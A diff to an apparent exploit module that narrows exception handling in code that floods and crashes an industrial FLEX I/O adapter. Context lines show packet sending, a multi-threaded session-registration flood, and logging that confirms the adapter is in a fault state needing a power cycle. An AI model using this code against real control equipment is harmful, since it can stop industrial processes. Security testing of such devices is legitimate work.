@@ -93,7 +93,7 @@ def _register_session(host: str, port: int, timeout: float = 3.0) -> int:
             resp = sock.recv(28)
             if len(resp) >= 8:
                 return struct.unpack_from("<I", resp, 4)[0]
-    except Exception:
+    except (ConnectionError, TimeoutError, OSError):
         pass
     return 0
 
@@ -154,7 +154,7 @@ class Exploit(Exploit):
             return f"Port {self.port} closed at {self.target}"
         except TimeoutError:
             return f"Timeout at {self.target}:{self.port}"
-        except Exception as exc:
+        except (ConnectionError, TimeoutError, ValueError, OSError) as exc:
             return f"Check error: {exc}"
 
     def run(self) -> None:
@@ -195,7 +195,7 @@ class Exploit(Exploit):
             except ConnectionRefusedError:
                 logger.info("[+] Connection refused after pkt %d - adapter likely crashed", i + 1)
                 return
-            except Exception as exc:
+            except (ConnectionError, TimeoutError, ValueError, OSError) as exc:
                 logger.warning("[*] Pkt %d error: %s", i + 1, exc)
             time.sleep(0.3)
 
@@ -213,7 +213,7 @@ class Exploit(Exploit):
                     with socket.create_connection((host, port), timeout=1) as sock:
                         sock.sendall(_REGISTER_SESSION)
                         sock.recv(28)
-                except Exception:
+                except (ConnectionError, TimeoutError, OSError):
                     pass
 
         for _ in range(n_threads):
@@ -240,6 +240,6 @@ class Exploit(Exploit):
             logger.info("[+] CONFIRMED: Port closed - FLEX I/O adapter in fault state (power cycle required)")
         except TimeoutError:
             logger.info("[+] Timeout - adapter likely unresponsive")
-        except Exception as exc:
+        except (ConnectionError, TimeoutError, ValueError, OSError) as exc:
             logger.warning("[*] Verify error: %s", exc)
 
